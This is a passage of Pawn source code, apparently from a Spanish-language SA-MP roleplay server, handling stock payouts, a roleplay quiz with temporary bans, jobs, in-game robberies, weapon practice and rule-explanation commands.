		if(acciones[playerid][aAccTipo][i] && idia != negocio[ acciones[playerid][aAccTipo][i] ][bDiario])
		{
			ganaDinero(playerid, acciones[playerid][aAccCantidad][i] * negocio[acciones[playerid][aAccTipo][i]][bPrecioFinal]);
			
			format(string, sizeof(string), "Has recibido %d$ por las acciones compradas, costo actual %d$ accion del negocio %s", acciones[playerid][aAccCantidad][i] * negocio[acciones[playerid][aAccTipo][i]][bPrecioFinal], negocio[acciones[playerid][aAccTipo][i]][bPrecioFinal], negocio[acciones[playerid][aAccTipo][i]][bName]);
			Mensaje(playerid, COLOR_VERDE, string);
			
			acciones[playerid][aAccTipo][i] = 0;
			acciones[playerid][aAccCantidad][i] = 0;
		}
	}
	return 1;
}
CallBack::HacerPruebaRol(playerid)
{
	new x = cuenta[playerid][cInv1][0], tmp[128 * 4];
	switch(x)
	{
		case 0 .. 9:
		{
			format(tmp, sizeof(tmp), "%s\n%s\n%s", pruebarol[x][opciona], pruebarol[x][opcionb], pruebarol[x][opcionc]);
			ShowPlayerDialog(playerid, DIALOGO_PRUEBA_ROL, DIALOG_STYLE_LIST, pruebarol[x][pregunta], tmp, "Siguiente", "");
		}
		case 10:
		{
			switch(enteroChar[cPrueba]{playerid})
			{
				case 6:
				{
					format(tmp, sizeof(tmp), "Usted ha fallado %d/10 vuelva a intentarlo en 5 minutos.", enteroChar[cPrueba]{playerid});
					Mensaje(playerid, COLOR_ROJO, tmp);
					
					mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "INSERT INTO zz_bantmp(nombreadmin, nombrejugador, razon, fecha, segundos) VALUES ('%s', '%s', 'Fallar Prueba', '%s', %d)", Nombre(playerid), Nombre(playerid), ObtenerFecha(), (gettime() + 300));
					mysql_tquery(servidor[mysqlControl], tmp);
					Kick(playerid);
				}
				case 3 .. 5:
				{
					format(tmp, sizeof(tmp), "Usted ha fallado %d/10 vuelva a intentarlo en 20 minutos.", enteroChar[cPrueba]{playerid});
					Mensaje(playerid, COLOR_ROJO, tmp);
					
					mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "INSERT INTO zz_bantmp(nombreadmin, nombrejugador, razon, fecha, segundos) VALUES ('%s', '%s', 'Fallar Prueba', '%s', %d)", Nombre(playerid), Nombre(playerid), ObtenerFecha(), (gettime() + 1200));
					mysql_tquery(servidor[mysqlControl], tmp);
					Kick(playerid);
				}
				case 0 .. 2:
				{
					format(tmp, sizeof(tmp), "Usted ha fallado %d/10 vuelva a intentarlo en 40 minutos.", enteroChar[cPrueba]{playerid});
					Mensaje(playerid, COLOR_ROJO, tmp);
					
					mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "INSERT INTO zz_bantmp(nombreadmin, nombrejugador, razon, fecha, segundos) VALUES ('%s', '%s', 'Fallar Prueba Leer Guias', '%s', %d)", Nombre(playerid), Nombre(playerid), ObtenerFecha(), (gettime() + 2400));
					mysql_tquery(servidor[mysqlControl], tmp);
					Kick(playerid);
				}
				default:
				{
					cuenta[playerid][cInv1][0] = 11;
					Mensaje(playerid, COLOR_VERDE, "Usted paso la prueba de rol puede jugar.");
				}
			}
		}
	}
	return 1;
}
CallBack::accionesEstado()
{
	for(new i=0; i<sizeof(negocio); i++)
	{
		if(!negocio[i][bOwned]) continue;
		negocio[i][bPrecioneto] = float(negocio[i][bBuyPrice]) * 0.05 / 100.0;
		new intyear, intmes, intdia;
		getdate(intyear, intmes, intdia);
		if(intdia != negocio[i][bDiario])
		{
			negocio[i][bDiario] = intdia;
			negocio[i][bRating] = 1 + random(50);
			if(negocio[i][bLastrating] > negocio[i][bRating])
			{
				//bajada
				negocio[i][bRating] = 1 + random(negocio[i][bLastrating]);
				negocio[i][bEstado] = 0;
			}
			else
			{
				//Subida
				negocio[i][bEstado] = 1;
			}
			negocio[i][bLastrating] = negocio[i][bRating];
			negocio[i][bPrecioFinal] = floatround(negocio[i][bPrecioneto]) + negocio[i][bRating];
		}
	}
	/*for(new i=0, t=GetMaxPlayers(); i<t; i++)
	{
		if(!IsPlayerConnected(i))continue;
		devaccGanancia(i);
	}*/
	return 1;
}
CallBack::encenderAuto(playerid)
{
	if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		new string[126], vehicle = GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective, Float:health;
		GetVehicleParamsEx(vehicle, engine, lights, alarm, doors, bonnet, boot, objective);
		if(EsComprable(vehicle))
		{
			if(!LlaveVehicular(playerid, vehicle))
			{
				return 1;
			}
		}
		if(!vehiculoEncendido[vehicle])
		{
			if(EsBicicleta(vehicle))
			{
				SetVehicleParamsEx(vehicle, 1, lights, alarm, doors, bonnet, boot, objective);
				Mensaje(playerid, COLOR_VERDE, "Le has retirado el seguro a tu Bicicleta.");
				return 1;
			}
			GetVehicleHealth(vehicle, health);
			if(health > 300)
			{
				format(string, sizeof(string), "* %s metió y giró la llave del vehículo.", PlayerName(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				GameTextForPlayer(playerid, "~w~Enciendiendo vehiculo....", 3000, 3);
				TogglePlayerControllable(playerid, false);
				SetTimerEx("encenderMotor", 3000, false, "d", playerid);
				return 1;
			}
			else
			{
				SetVehicleParamsEx(vehicle, 0, lights, alarm, doors, bonnet, boot, objective);
				vehiculoEncendido[vehicle] = false;
				TogglePlayerControllable(playerid, false);
				Mensaje(playerid, COLOR_AMARILLO, "* No puedes encender el vehículo debido al daño, llama a un mecánico.");
				return 1;
			}
		}
		else
		{
			if(EsBicicleta(vehicle))return 1;
			format(string, sizeof(string), "* %s apagó el motor del vehículo y quitó las llaves.", PlayerName(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			SetVehicleParamsEx(vehicle, 0, lights, alarm, doors, bonnet, boot, objective);
			vehiculoEncendido[vehicle] = false;
			return 1;
		}
	}
	return 1;
}
CallBack::transCargamento(playerid, trabid)
{
	new string[126];
	switch(trabid)
	{
		case 1:
		{
			format(string, sizeof(string), "Dirija este cargamento hacia ~g~%s~w~.", trabTransportador[0][transLugar]);
			TextoInformatico(8, playerid, string);
			
			TogglePlayerControllable(playerid, true);
			SetPlayerCheckpoint(playerid, trabTransportador[0][transPos][0], trabTransportador[0][transPos][1], trabTransportador[0][transPos][2], 4.0);
		}
		case 2:
		{
			format(string, sizeof(string), "Dirija este cargamento hacia ~g~%s~w~.", trabAviador[0][aviLugar]);
			TextoInformatico(8, playerid, string);
			
			TogglePlayerControllable(playerid, true);
			SetPlayerCheckpoint(playerid, trabAviador[0][aviPos][0], trabAviador[0][aviPos][1], trabAviador[0][aviPos][2], 4.0);
		}
		case 3:
		{
			format(string, sizeof(string), "Dirija este cargamento hacia ~g~%s~w~.", trabCamionero[0][camLugar]);
			TextoInformatico(8, playerid, string);
			
			TogglePlayerControllable(playerid, true);
			SetPlayerCheckpoint(playerid, trabCamionero[0][camPos][0], trabCamionero[0][camPos][1], trabCamionero[0][camPos][2], 4.0);
		}
		case 4:
		{
			new listed = cuenta[playerid][selecciono];
			format(string, sizeof(string), "Dirija este camion a la ~g~%s~w~.", trabCamionero[listed][camLugar]);
			TextoInformatico(8, playerid, string);
			
			TogglePlayerControllable(playerid, true);
			SetPlayerCheckpoint(playerid, trabCamionero[listed][camPos][0], trabCamionero[listed][camPos][1], trabCamionero[listed][camPos][2], 4.0);
		}
		case 5:
		{
			format(string, sizeof(string), "Regrese a ~g~%s~w~.", trabBarrendero[0][barrLugar]);
			TextoInformatico(8, playerid, string);
			
			TogglePlayerControllable(playerid, true);
			SetPlayerCheckpoint(playerid, trabBarrendero[0][barrPos][0], trabBarrendero[0][barrPos][1], trabBarrendero[0][barrPos][2], 4.0);
		}		
		case 6:
		{
			cuenta[playerid][selecciono2]++;
			switch(cuenta[playerid][selecciono])
			{
				case 1:
				{
					switch(cuenta[playerid][selecciono2])
					{
						case 1: SetPlayerCheckpoint(playerid, 1153.0146, -1641.9800, 13.8852, 4.0);
						case 2: SetPlayerCheckpoint(playerid, 1199.1293, -1480.8783, 13.4805, 4.0);
						case 3: SetPlayerCheckpoint(playerid, 1320.8348, -1408.8724, 13.3937, 4.0);
						case 4: SetPlayerCheckpoint(playerid, 1362.6458, -1107.3684, 23.9130, 4.0);
						case 5: SetPlayerCheckpoint(playerid, 1550.4543, -1063.0874, 23.6929, 4.0);
						case 6: SetPlayerCheckpoint(playerid, 1737.7354, -1164.2529, 23.7350, 4.0);
						case 7: SetPlayerCheckpoint(playerid, 1926.1710, -1138.2739, 25.0615, 4.0);
						case 8: SetPlayerCheckpoint(playerid, 2108.4004, -1108.4307, 25.1831, 4.0);
						case 9: SetPlayerCheckpoint(playerid, 2340.8979, -1156.9491, 27.0879, 4.0);
						case 10: SetPlayerCheckpoint(playerid, 2368.4270, -1344.4429, 23.9369, 4.0);
						case 11: SetPlayerCheckpoint(playerid, 2153.8381, -1381.9397, 23.9330, 4.0);
						case 12: SetPlayerCheckpoint(playerid, 1889.5862, -1338.6761, 13.4854, 4.0);
						case 13: SetPlayerCheckpoint(playerid, 1794.4263, -1452.5919, 13.4740, 4.0);
						case 14: SetPlayerCheckpoint(playerid, 1485.4230, -1438.3306, 13.4872, 4.0);
						case 15: SetPlayerCheckpoint(playerid, 1317.4318, -1499.3212, 13.4908, 4.0);
						case 16: SetPlayerCheckpoint(playerid, 1294.9037, -1811.0547, 13.4840, 4.0);
						case 17: SetPlayerCheckpoint(playerid, trabBuses[0][busPos][0], trabBuses[0][busPos][1], trabBuses[0][busPos][2], 4.0);
					}
				}				
				case 2:
				{
					switch(cuenta[playerid][selecciono2])
					{
						case 1: SetPlayerCheckpoint(playerid, 1056.4014, -1482.7505, 13.4891, 4.0);
						case 2: SetPlayerCheckpoint(playerid, 858.4039, -1393.0964, 13.4165, 4.0);
						case 3: SetPlayerCheckpoint(playerid, 640.4000, -1345.6577, 13.4798, 4.0);
						case 4: SetPlayerCheckpoint(playerid, 537.6367, -1241.7842, 16.6966, 4.0);
						case 5: SetPlayerCheckpoint(playerid, 171.5627, -1514.4479, 12.3561, 4.0);
						case 6: SetPlayerCheckpoint(playerid, 589.5089, -1742.0437, 13.2290, 4.0);
						case 7: SetPlayerCheckpoint(playerid, 983.2041, -1804.3685, 14.1774, 4.0);
						case 8: SetPlayerCheckpoint(playerid, 1123.5647, -1855.0795, 13.4779, 4.0);
						case 9: SetPlayerCheckpoint(playerid, trabBuses[0][busPos][0], trabBuses[0][busPos][1], trabBuses[0][busPos][2], 4.0);
					}
				}
				case 3:
				{
					switch(cuenta[playerid][selecciono2])
					{
						case 1: SetPlayerCheckpoint(playerid, 1342.9044, -1861.4083, 13.4821, 4.0);
						case 2: SetPlayerCheckpoint(playerid, 1643.2467, -1875.4707, 13.4853, 4.0);
						case 3: SetPlayerCheckpoint(playerid, 1878.5171, -1934.9835, 13.4843, 4.0);
						case 4: SetPlayerCheckpoint(playerid, 2084.7314, -1847.5837, 13.4854, 4.0);
						case 5: SetPlayerCheckpoint(playerid, 2345.4807, -1710.0203, 13.4637, 4.0);
						case 6: SetPlayerCheckpoint(playerid, 2147.7561, -1624.6281, 13.5354, 4.0);
						case 7: SetPlayerCheckpoint(playerid, 1896.3553, -1749.1943, 13.4779, 4.0);
						case 8: SetPlayerCheckpoint(playerid, 1585.9586, -1729.3464, 13.4818, 4.0);
						case 9: SetPlayerCheckpoint(playerid, 1503.5535, -1869.5864, 13.4826, 4.0);
						case 10: SetPlayerCheckpoint(playerid, 1233.8889, -1849.6936, 13.4788, 4.0);
						case 11: SetPlayerCheckpoint(playerid, trabBuses[0][busPos][0], trabBuses[0][busPos][1], trabBuses[0][busPos][2], 4.0);
					}
				}
			}
			TextoInformatico(8, playerid, "Avance a la siguiente parada.");
			TogglePlayerControllable(playerid, true);
		}
		case 7:
		{
			new i = cuenta[playerid][selecciono2];
			DestroyDynamicObject(trabBasurero[i][basObjeto]);
			trabBasurero[i][basObjeto] = CreateDynamicObject(trabBasurero[i][basOmodel], trabBasurero[i][basPosOb][0], trabBasurero[i][basPosOb][1], trabBasurero[i][basPosOb][2], trabBasurero[i][basPosOb][3], trabBasurero[i][basPosOb][4], trabBasurero[i][basPosOb][5]);
			TogglePlayerControllable(playerid, true);
			
			cuenta[playerid][selecciono]++;
			switch(cuenta[playerid][selecciono])
			{
				case 0 .. 3:
				{
					i = cuenta[playerid][selecciono2] = random(sizeof(trabBasurero));
					SetPlayerCheckpoint(playerid, trabBasurero[i][basPos][0], trabBasurero[i][basPos][1], trabBasurero[i][basPos][2], 3.0);
					TextoInformatico(20, playerid, "Avance al siguiente bote de basura.");
				}
				case 4:
				{
					TextoInformatico(20, playerid, "Dirijase al centro de descarga de basura.");
					SetPlayerCheckpoint(playerid, 2186.4143, -1978.9795, 13.2793, 3.0);
				}
			}
		}
		case 8:
		{
			TogglePlayerControllable(playerid, true);
			comenzarPescar(playerid);
		}
		case 9:
		{
			new id = cuenta[playerid][selecciono2];
			if(IsPlayerInRangeOfPoint(playerid, 1.0, trabMinero[id][minPos][0], trabMinero[id][minPos][1], trabMinero[id][minPos][2]))
			{
				ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.1, 1, 1, 1, 1, 1, 1);
				SetPlayerAttachedObject(playerid, 8, 905, 1, 0.091406, 0.524996, -0.089951, 104.627159, 101.408142, 355.925109, 0.496518, 0.323948, 0.347671);
				SetPlayerCheckpoint(playerid, trabMinero[2][minPos][0], trabMinero[2][minPos][1], trabMinero[2][minPos][2], 1.0);
				TextoInformatico(10, playerid, "LLeve este mineral al punto ~r~rojo");
			}
			else
			{
				cuenta[playerid][selecciono2] = 0;
				TextoInformatico(10, playerid, "~r~Usted ha fallado al intentar sacar el mineral.");
			}
			return 1;
		}
		case 10:
		{
			new id = cuenta[playerid][selecciono2];
			if(IsPlayerInRangeOfPoint(playerid, 1.0, trabCarpintero[id][carPos][0], trabCarpintero[id][carPos][1], trabCarpintero[id][carPos][2]))
			{
				ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.1, 1, 1, 1, 1, 1, 1);
				SetPlayerAttachedObject(playerid, 8, 1817, 17, -0.278, 0.187, 0.455999, -4.81, 94.299995, -0.099999, 1.0, 1.0, 1.0);
				SetPlayerCheckpoint(playerid, trabCarpintero[0][carPos][0], trabCarpintero[0][carPos][1], trabCarpintero[0][carPos][2], 1.0);
				TextoInformatico(10, playerid, "LLeve este mueble al punto ~r~rojo");
			}
			else
			{
				cuenta[playerid][selecciono2] = 0;
				TextoInformatico(10, playerid, "~r~Usted ha fallado al intentar crear el mueble.");
			}
		}		
		case 11:
		{
			new id = cuenta[playerid][selecciono2];
			if(IsPlayerInRangeOfPoint(playerid, 1.0, trabObrero[id][obrPos][0], trabObrero[id][obrPos][1], trabObrero[id][obrPos][2]))
			{
				new paga = 65 + random(15);
				cuenta[playerid][pagas] += paga;
				format(string, sizeof(string), "Usted recibio ~g~%d$ ~w~por su esfuerzo, acumulado ~g~%d$", paga, cuenta[playerid][pagas]);
				TextoInformatico(20, playerid, string);
				cuenta[playerid][selecciono] = 0;
				cuenta[playerid][selecciono2] = 0;
				ClearAnimations(playerid, 1);
			}
			else
			{
				cuenta[playerid][selecciono2] = 0;
				TextoInformatico(10, playerid, "~r~Usted ha fallado al intentar construir.");
			}
		}
		case 12:
		{
			if(cuenta[playerid][cTrabajo] == 15 && cuenta[playerid][selecciono])
			{
				new i = cuenta[playerid][selecciono2];
				if(IsPlayerInRangeOfPoint(playerid, 50.0, negocio[i][bExitx], negocio[i][bExity], negocio[i][bExitz]))
				{
					new dinerorobado = 2000 + random(2000);
					format(string, sizeof(string), "Usted ha logrado robar ~g~%d$ ~w~de este negocio, Hulle!", dinerorobado);
					TextoInformatico(15, playerid, string);
					
					ganaDinero(playerid, dinerorobado);
					cuenta[playerid][cBusqueda] += 3;
					cuenta[playerid][cRobo] = gettime() + 1800;
					Mensaje(playerid, COLOR_GRIS2, "Usted ha recibido +3 nivel de busqueda por el robo.");
					
					cuenta[playerid][selecciono] = 0;
					cuenta[playerid][selecciono2] = 0;
					return 1;
				}
				else
				{
					cuenta[playerid][selecciono] = 0;
					cuenta[playerid][selecciono2] = 0;
					cuenta[playerid][cBusqueda] += 2;
					Mensaje(playerid, COLOR_GRIS2, "Usted ha recibido +2 nivel de busqueda por el robo fallido.");
					TextoInformatico(20, playerid, "~r~Usted ha fallado al intentar robar este negocio.");
				}
			}
		}
		case 13:
		{
			if(cuenta[playerid][cTrabajo] == 15 && cuenta[playerid][selecciono])
			{
				new i = cuenta[playerid][selecciono2];
				if(IsPlayerInRangeOfPoint(playerid, 50.0, casa[i][hExitx], casa[i][hExity], casa[i][hExitz]))
				{
					new dinerorobado = 500 + random(500);
					format(string, sizeof(string), "Usted ha logrado robar ~g~%d$ ~w~de esta casa, Hulle!", dinerorobado);
					TextoInformatico(15, playerid, string);
					
					ganaDinero(playerid, dinerorobado);
					cuenta[playerid][cBusqueda] += 2;
					cuenta[playerid][cRobo] = gettime() + 1200;
					Mensaje(playerid, COLOR_GRIS2, "Usted ha recibido +2 nivel de busqueda por el robo.");
					
					SetPosEx(playerid, casa[i][hEntrancex], casa[i][hEntrancey], casa[i][hEntrancez], 0, 0, 0);
					cuenta[playerid][cEntrada] = -1;
					
					cuenta[playerid][selecciono] = 0;
					cuenta[playerid][selecciono2] = 0;
					return 1;
				}
				else
				{
					SetPosEx(playerid, casa[i][hEntrancex], casa[i][hEntrancey], casa[i][hEntrancez], 0, 0, 0);
					cuenta[playerid][cEntrada] = -1;
					
					cuenta[playerid][selecciono] = 0;
					cuenta[playerid][selecciono2] = 0;
					cuenta[playerid][cBusqueda] += 1;
					Mensaje(playerid, COLOR_GRIS2, "Usted ha recibido +1 nivel de busqueda por el robo fallido.");
					TextoInformatico(20, playerid, "~r~Usted ha fallado al intentar robar esta casa.");
				}
			}
		}
	}
	return 1;
}
CallBack::SyncUp()
{
    SyncTime();
	if(PayDayLeft != 0) PayDayLeft -= 1;
	else if(!PayDayLeft) Paydays();
}
CallBack::SyncTime()
{
	new tmphour, tmpminute, tmpsecond;
	gettime(tmphour, tmpminute, tmpsecond);
	FixHour(tmphour);
	tmphour = shifthour;
	if ((tmphour > ghour) || (tmphour == 0 && ghour == 23))
	{
		ghour = tmphour;
		if (realtime)
		{
			SetWorldTime(tmphour);
		}
		if(tmphour == 10 || tmphour == 15 ||tmphour == 20 || tmphour == 3)
		{
			new string[80];
            format(string, sizeof(string), "{2F99B5}Noticias de la Loteria: {FFFFFF}Hemos empezado la elección de la loteria.");
	        OOCOff(COLOR_BLANCO, string);
	        Lotto(random(150));
		}
 	}
}

/*COMMAND:npcs(playerid, params[])
{
	if(RetornarNombre(playerid))
	{
		new jugador, opcion, tiempo, tmp[32], tmp2[48], string[224];
		if(sscanf(params, "d", opcion))
		{
			Mensaje(playerid, COLOR_BLANCO, "Utiliza /npcs [Opcion]");
			Mensaje(playerid, COLOR_BLANCO, "Opcion: 1.- tKick, 2.-Ban, 3.-tban, 4.-Jail, 5.-duty");
			return 1;
		}
		
		format(tmp, sizeof(tmp), "[NPC]%s", nonplayers[random(sizeof(nonplayers))][npcNombre]);
		
		switch(opcion)
		{
			case 1:
			{
				if(sscanf(params, "duds[48]", opcion, jugador, tiempo, tmp2))return Mensaje(playerid, COLOR_GRIS2, "Correcto: /npcs [1] [jugador] [tiempo] [razón]");
				if(tiempo < 0 || tiempo > 720)Mensaje(playerid, COLOR_GRIS, "El maximos de minutos kick es de 720.");
				if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS, "Este jugador no esta conectado!");
				
				new segundos = (tiempo * 60) + gettime();
				format(string, sizeof(string), "Administrador %s expulso(Kick) a %s por %s, Razon: %s", tmp, PlayerName(jugador), ObtenerTiempoRestante(segundos), tmp2);
				AdminMensaje(string);
				Mensaje(jugador, COLOR_ROJO, string);
				
				mysql_format(servidor[mysqlControl], string, sizeof(string), "INSERT INTO zz_bantmp(nombreadmin, nombrejugador, razon, fecha, segundos) VALUES ('%s', '%s', '%s', '%s', %d)", Nombre(playerid), Nombre(jugador), tmp2, ObtenerFecha(), segundos);
				mysql_tquery(servidor[mysqlControl], string);
				Kick(jugador);
			}
		}
	}
	return false;
}*/
COMMAND:practicar(playerid, params[])
{
	if(!cuenta[playerid][cLicenciaArma])return Mensaje(playerid, COLOR_GRIS2, "No posees la licencia de armas, por lo tanto no puedes comprar!");
	if(IsPlayerInRangeOfPoint(playerid, 10.0, 305.3573, -141.8143, 1004.0625))
	{
		switch(GetPlayerWeapon(playerid))
		{
			case 24:
			{
				if(cuenta[playerid][cDesert] >= 999)return Mensaje(playerid, COLOR_ROJO, "Ya no necesitas practicar con esta arma!");
				ShowPlayerDialog(playerid, DIALOGO_HABILIDAD_ARMAS, DIALOG_STYLE_LIST, "Lista de Aprendizajes", "5 Secuencias[200$]\n10 Secuencias[380$]\n15 Secuencias[760$]\n10 Secuencias[EXP: x3][120 ZZCASH]\n20 Secuencias[EXP: x3][220 ZZCASH]\n30 Secuencias[EXP: x4][400 ZZCASH]", "Aceptar", "Salir");
			}
			case 25:
			{
				if(cuenta[playerid][cEscopeta] >= 999)return Mensaje(playerid, COLOR_ROJO, "Ya no necesitas practicar con esta arma!");
				ShowPlayerDialog(playerid, DIALOGO_HABILIDAD_ARMAS, DIALOG_STYLE_LIST, "Lista de Aprendizajes", "5 Secuencias[200$]\n10 Secuencias[380$]\n15 Secuencias[760$]\n10 Secuencias[EXP: x3][120 ZZCASH]\n20 Secuencias[EXP: x3][220 ZZCASH]\n30 Secuencias[EXP: x4][400 ZZCASH]", "Aceptar", "Salir");
			}
			case 29:
			{
				if(cuenta[playerid][cMP5] >= 999)return Mensaje(playerid, COLOR_ROJO, "Ya no necesitas practicar con esta arma!");
				ShowPlayerDialog(playerid, DIALOGO_HABILIDAD_ARMAS, DIALOG_STYLE_LIST, "Lista de Aprendizajes", "5 Secuencias[200$]\n10 Secuencias[380$]\n15 Secuencias[760$]\n10 Secuencias[EXP: x3][120 ZZCASH]\n20 Secuencias[EXP: x3][220 ZZCASH]\n30 Secuencias[EXP: x4][400 ZZCASH]", "Aceptar", "Salir");
			}
			case 30:
			{
				if(cuenta[playerid][cAK47] >= 999)return Mensaje(playerid, COLOR_ROJO, "Ya no necesitas practicar con esta arma!");
				ShowPlayerDialog(playerid, DIALOGO_HABILIDAD_ARMAS, DIALOG_STYLE_LIST, "Lista de Aprendizajes", "5 Secuencias[200$]\n10 Secuencias[380$]\n15 Secuencias[760$]\n10 Secuencias[EXP: x3][120 ZZCASH]\n20 Secuencias[EXP: x3][220 ZZCASH]\n30 Secuencias[EXP: x4][400 ZZCASH]", "Aceptar", "Salir");
			}
			case 31:
			{
				if(cuenta[playerid][cM4] >= 999)return Mensaje(playerid, COLOR_ROJO, "Ya no necesitas practicar con esta arma!");
				ShowPlayerDialog(playerid, DIALOGO_HABILIDAD_ARMAS, DIALOG_STYLE_LIST, "Lista de Aprendizajes", "5 Secuencias[200$]\n10 Secuencias[380$]\n15 Secuencias[760$]\n10 Secuencias[EXP: x3][120 ZZCASH]\n20 Secuencias[EXP: x3][220 ZZCASH]\n30 Secuencias[EXP: x4][400 ZZCASH]", "Aceptar", "Salir");
			}
			case 34:
			{
				if(cuenta[playerid][cSniper] >= 999)return Mensaje(playerid, COLOR_ROJO, "Ya no necesitas practicar con esta arma!");
				ShowPlayerDialog(playerid, DIALOGO_HABILIDAD_ARMAS, DIALOG_STYLE_LIST, "Lista de Aprendizajes", "5 Secuencias[200$]\n10 Secuencias[380$]\n15 Secuencias[760$]\n10 Secuencias[EXP: x3][120 ZZCASH]\n20 Secuencias[EXP: x3][220 ZZCASH]\n30 Secuencias[EXP: x4][400 ZZCASH]", "Aceptar", "Salir");
			}
			default: Mensaje(playerid, COLOR_GRIS2, "Con esta arma no puedes practicar!");
		}
	}else Mensaje(playerid, COLOR_GRIS2, "No estas en la armeria!");
	return 1;
}
public OnPlayerObjectMoved(playerid, objectid)
{
	new x = enteroChar[gAnden]{playerid}, y = random(15);
	if(x != 255)
	{
		habilidadArmas[x][hA@secuencia]++;
		if(habilidadArmas[x][hA@secuencia] >= habilidadArmas[x][hA@secuenciatmp])
		{
			habilidadArmas[x][hA@uso] = false;
			enteroChar[gAnden]{playerid} = 255;
			SetPlayerPos(playerid, 305.3573, -141.8143, 1004.0625);
			DestroyPlayerObject(playerid, habilidadArmas[x][hA@objetoid]);
			SetPlayerTeam(playerid, NO_TEAM);
			Mensaje(playerid, COLOR_VERDE, "Practica terminada!");
			return 1;
		}
		new Float:imov = 290.0 - y;
		switch(habilidadArmas[x][hA@secuencia])
		{
			case 1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29:
			{
				MovePlayerObject(playerid, habilidadArmas[x][hA@objetoid], imov, habilidadArmas[x][hA@pos][1], habilidadArmas[x][hA@pos][2] + 5.0, 2.0, 0.0, 0.0, 90.0);
			}
			case 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30:
			{
				MovePlayerObject(playerid, habilidadArmas[x][hA@objetoid], imov, habilidadArmas[x][hA@pos][1], habilidadArmas[x][hA@pos][2] - 5.0, 2.0, 0.0, 0.0, 90.0);
			}
		}
	}
	return 1;
}
COMMAND:reglas(playerid)
{
	Mensaje(playerid, COLOR_ROJO, "1. {FFFFFF}Al chocar siempre deberás rolear con /me y /do");
	Mensaje(playerid, COLOR_ROJO, "2. {FFFFFF}En las zonas públicas, no deberás realizar ningún tipo de acción ilegal.");
	Mensaje(playerid, COLOR_ROJO, "3. {FFFFFF}En todo momento, ten en cuenta el entorno.");
	Mensaje(playerid, COLOR_ROJO, "4. {FFFFFF}Si vas a hacerle daño a alguien, deberás tener algún motivo IC para hacerlo.");
	Mensaje(playerid, COLOR_ROJO, "5. {FFFFFF}En todo momento deberás estar ON ROL a menos que un Administrador diga lo contrario.");
	Mensaje(playerid, COLOR_ROJO, "6. {FFFFFF}Al saltar paredes, vallas o rejas, deberás rolearlo con /intentar.");
	Mensaje(playerid, COLOR_ROJO, "7. {FFFFFF}En todo momento mantén respeto para con los demás usuarios.");
	Mensaje(playerid, COLOR_ROJO, "8. {FFFFFF}Si quieres averiguar localizaciones IC, deberás averiguarlas IC, como en la vida real.");
	Mensaje(playerid, COLOR_ROJO, "9. {FFFFFF}Recuerda que cuando te matan, pierdes la memoria parcialmente. Nunca vuelvas al lugar donde te mataron para cobrar venganza.");
	Mensaje(playerid, COLOR_ROJO, "10. {FFFFFF}Mentir a la administración, o estafar OOC es motivo de Ban... ten cuidado.");
	return 1;
}
COMMAND:dm(playerid)
{
	Mensaje(playerid, -1, "{FF8C00}DM (DeathMatch).");
	Mensaje(playerid, -1, "Esto hace referencia a la acción de atacar a un usuario con intenciones de matarlo o bien, matar a su personaje sin motivo ni rol alguno.");
	Mensaje(playerid, -1, "Por ejemplo, si voy caminando por la calle, y justo pasa una persona, saco mi arma y le disparo porque tenía ganas o porque estaba aburrido");
	Mensaje(playerid, -1, "También sería el caso de un bate o con las manos. En cambio, si voy por la calle tranquilo y un sujeto me insulta, para poder atacarlo debo");
	Mensaje(playerid, -1, "rolear enojarme y contestarle. En cambio, si voy por la calle tranquilo y un sujeto me insulta, para poder atacarlo debo rolear enojarme");
	Mensaje(playerid, -1, "y contestarle para luego hacer la acción de atacarlo. Ten cuidado de donde roleas este tipo de acciones.");
	return 1;
}

COMMAND:pg(playerid)
{
	Mensaje(playerid, -1, "{FF8C00}PG (Powergaming).");
	Mensaje(playerid, -1, "Este concepto hace referencia a las acciones que realiza el personaje que serían totalmente imposibles en la vida real o acciones que te");
	Mensaje(playerid, -1, "llevarían directamente a la muerte, por ejemplo si te vienen a robar 5 personas con M4 amenazando con matarte y tu no les das lo que quieren");
	Mensaje(playerid, -1, "e intentas escapar, en la vida real te llenarían de balas, por lo tanto, morirías. Como conclusión, sabemos que el PG es hacer acciones");
	Mensaje(playerid, -1, "imposibles en la vida real o forzar el rol de otros jugadores.");
	return 1;
}

COMMAND:mg(playerid)
{
	Mensaje(playerid, -1, "{FF8C00}MG (MetaGaming).");
	Mensaje(playerid, -1, "Este concepto hace referencia a la confusión de canales IC con OOC (y viceversa). A pesar de que este concepto sea sencillo de aprender");
	Mensaje(playerid, -1, "es difícil la comprensión entre la diferencia de los canales IC con OOC y cuando usar cada uno de forma correcta.");
	Mensaje(playerid, -1, "Además se considera MG al uso de información obtenida de modo OOC para uso y beneficio IC.");
	return 1;
}

COMMAND:fk(playerid)
{
	Mensaje(playerid, -1, "{FF8C00}FK (FreeKill).");
	Mensaje(playerid, -1, "Hace referencia a un DM en masa, es decir, matar a una multitud de gente por antojo, sin realizar rol alguno.");
	Mensaje(playerid, -1, "Por ejemplo, ves que hay un grupo de gente en un bar y decides sacar tu arma o tirar una granada y matarlos a todos, eso sería un FreeKill.");
 	Mensaje(playerid, -1, "Ten cuidado con hacerlo, es sancionado con Ban Permanente.");
	return 1;
}

COMMAND:ck(playerid)
{
	Mensaje(playerid, -1, "{FF8C00}CK (Carkill).");
	Mensaje(playerid, -1, "Este concepto hace referencia a cuando un jugador que está dentro de una uto pisa o atropella a otro jugador");
	Mensaje(playerid, -1, "dejándolo tirado en el piso, sin ser capaz de levantarse o que haga alguna acción sucesivamente.");
	Mensaje(playerid, -1, "Por ejemplo, un tipo le pega a mi auto, entonces lo atropello una y otra vez o le dejo el auto encima sin que pueda moverse");
